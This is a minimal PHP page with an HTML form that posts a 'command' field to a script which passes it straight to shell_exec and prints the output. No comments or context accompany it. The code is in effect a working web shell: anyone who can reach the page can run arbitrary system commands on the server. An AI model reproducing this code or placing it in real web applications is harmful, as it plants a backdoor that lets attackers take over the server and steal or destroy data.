<form action ="command.php" method ="post">
<input type = "text" name="command">
<input type="submit">
</form>    


<?php

$command = $_POST['command'];

$result = shell_exec($command);

print "<pre>".$result."</pre>";
?>